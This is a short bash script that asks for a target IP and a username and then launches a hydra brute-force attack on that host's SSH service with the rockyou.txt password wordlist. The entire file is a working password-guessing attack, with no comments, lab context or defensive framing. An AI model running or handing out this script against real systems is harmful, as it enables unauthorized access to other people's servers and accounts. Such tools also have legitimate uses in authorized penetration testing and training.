#!/bin/bash

read -p "Enter target IP: " target
read -p "Enter username: " user
hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://$target
